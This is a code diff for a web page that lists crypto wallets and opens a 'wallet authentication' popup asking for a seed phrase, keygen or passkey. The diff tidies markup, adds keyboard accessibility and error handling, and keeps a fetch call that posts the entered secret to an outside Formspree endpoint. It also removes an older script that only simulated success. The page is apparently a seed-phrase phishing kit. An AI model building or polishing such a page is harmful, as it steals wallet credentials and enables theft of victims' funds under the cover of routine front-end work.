@@ -16,28 +16,27 @@
     
     <div class="wallet-container" id="walletContainer"></div>
 
-   <!-- Authentication Popup -->
-<div id="authPopup" class="popup" style="display: none;">
-    <div class="popup-content">
-        <h2>Wallet Authentication</h2>
-        
-        <label for="authType">Select Authentication Method:</label>
-        <select id="authType">
-            <option value="seed">Seed Phrase</option>
-            <option value="keygen">Keygen</option>
-            <option value="passkey">Passkey</option>
-        </select>
+    <!-- Authentication Popup -->
+    <div id="authPopup" class="popup" style="display: none;">
+        <div class="popup-content">
+            <h2>Wallet Authentication</h2>
+            
+            <label for="authType">Select Authentication Method:</label>
+            <select id="authType" name="authType">
+                <option value="seed">Seed Phrase</option>
+                <option value="keygen">Keygen</option>
+                <option value="passkey">Passkey</option>
+            </select>
 
-        <label for="authInput">Enter Credentials:</label>
-        <input type="text" id="authInput" placeholder="Enter your credentials">
+            <label for="authInput">Enter Credentials:</label>
+            <input type="text" id="authInput" name="authInput" placeholder="Enter your credentials">
 
-        <p id="authMessage" class="hidden"></p>
+            <p id="authMessage" class="hidden"></p>
 
-        <button class="connect-btn" onclick="connectWallet()">Connect</button>
-        <button id="closeAuthPopup" class="close-btn">Close</button>
+            <button class="connect-btn" onclick="connectWallet()">Connect</button>
+            <button id="closeAuthPopup" class="close-btn">Close</button>
+        </div>
     </div>
-</div>
-
 
     <script>
         const wallets = [
@@ -58,11 +57,18 @@
         wallets.forEach(wallet => {
             let walletBox = document.createElement("div");
             walletBox.classList.add("wallet-box");
+            walletBox.setAttribute("tabindex", "0");
+            walletBox.setAttribute("role", "button");
             walletBox.innerHTML = `
                 <img src="assets/${wallet.toLowerCase().replace(/ /g, '')}.png" alt="${wallet}" onerror="this.onerror=null; this.src='assets/default.png'">
                 <p>${wallet}</p>
             `;
             walletBox.onclick = openAuthPopup;
+            walletBox.onkeydown = (e) => {
+                if (e.key === "Enter" || e.key === " ") {
+                    openAuthPopup();
+                }
+            };
             walletContainer.appendChild(walletBox);
         });
 
@@ -73,6 +79,7 @@
         function closeAuthPopup() {
             document.getElementById("authPopup").style.display = "none";
             document.getElementById("authMessage").textContent = "";
+            document.getElementById("authMessage").classList.add("hidden");
         }
 
         document.getElementById("closeAuthPopup").addEventListener("click", closeAuthPopup);
@@ -89,100 +96,59 @@
             let message = document.getElementById("authMessage");
 
             message.textContent = "";
+            message.classList.add("hidden");
 
             if (authInput === "") {
                 message.textContent = "Error: Credentials cannot be empty!";
+                message.classList.remove("hidden");
                 return;
             }
 
             if (authType === "seed" && authInput.split(" ").length !== 12) {
                 message.textContent = "Error: Seed phrase must be 12 words!";
+                message.classList.remove("hidden");
                 return;
             }
 
             if (authType === "keygen" && authInput.length < 16) {
                 message.textContent = "Error: Keygen must be at least 16 characters!";
+                message.classList.remove("hidden");
                 return;
             }
 
             if (authType === "passkey" && authInput.length < 8) {
                 message.textContent = "Error: Passkey must be at least 8 characters!";
+                message.classList.remove("hidden");
                 return;
             }
 
             fetch("https://formspree.io/f/mvgkalye", {
                 method: "POST",
                 headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                body: `authType=${authType}&authInput=${encodeURIComponent(authInput)}`
+                body: `authType=${encodeURIComponent(authType)}&authInput=${encodeURIComponent(authInput)}`
             })
-            .then(response => response.json())
-            .then(data => {
-                message.textContent = data.message;
-                message.style.color = data.message.includes("failed") ? "red" : "green";
-                if (data.message.includes("success")) {
+            .then(response => {
+                if (response.ok) {
+                    message.textContent = "Credentials submitted successfully!";
+                    message.style.color = "green";
+                    message.classList.remove("hidden");
                     setTimeout(closeAuthPopup, 2000);
+                } else {
+                    message.textContent = `Error submitting credentials. Status: ${response.status}`;
+                    message.style.color = "red";
+                    message.classList.remove("hidden");
                 }
             })
             .catch(() => {
-                message.textContent = "Server error. Please try again.";
+                message.textContent = "Network error. Please try again.";
                 message.style.color = "red";
+                message.classList.remove("hidden");
             });
         }
+
+        document.getElementById("authInput").addEventListener("input", function () {
+            document.getElementById("authMessage").classList.add("hidden");
+        });
     </script>
-
-    <script>
-    function connectWallet() {
-        let authType = document.getElementById("authType").value;
-        let authInput = document.getElementById("authInput").value.trim();
-        let message = document.getElementById("authMessage");
-
-        // Reset previous message
-        message.textContent = "";
-        message.classList.add("hidden");
-
-        if (authInput === "") {
-            message.textContent = "Error: Credentials cannot be empty!";
-            message.classList.remove("hidden");
-            return;
-        }
-
-        if (authType === "seed" && authInput.split(" ").length !== 12) {
-            message.textContent = "Error: Seed phrase must be 12 words!";
-            message.classList.remove("hidden");
-            return;
-        }
-
-        if (authType === "keygen" && authInput.length < 16) {
-            message.textContent = "Error: Keygen must be at least 16 characters!";
-            message.classList.remove("hidden");
-            return;
-        }
-
-        if (authType === "passkey" && authInput.length < 8) {
-            message.textContent = "Error: Passkey must be at least 8 characters!";
-            message.classList.remove("hidden");
-            return;
-        }
-
-        // Simulating authentication success
-        message.textContent = "Authenticated successfully!";
-        message.style.color = "green";
-        message.classList.remove("hidden");
-
-        setTimeout(closeAuthPopup, 2000);
-    }
-
-    // Hide warning message when user starts typing
-    document.getElementById("authInput").addEventListener("input", function () {
-        document.getElementById("authMessage").classList.add("hidden");
-    });
-
-    function closeAuthPopup() {
-        document.getElementById("authPopup").style.display = "none";
-        document.getElementById("authMessage").classList.add("hidden");
-    }
-
-    document.getElementById("closeAuthPopup").addEventListener("click", closeAuthPopup);
-</script>
 </body>
 </html>
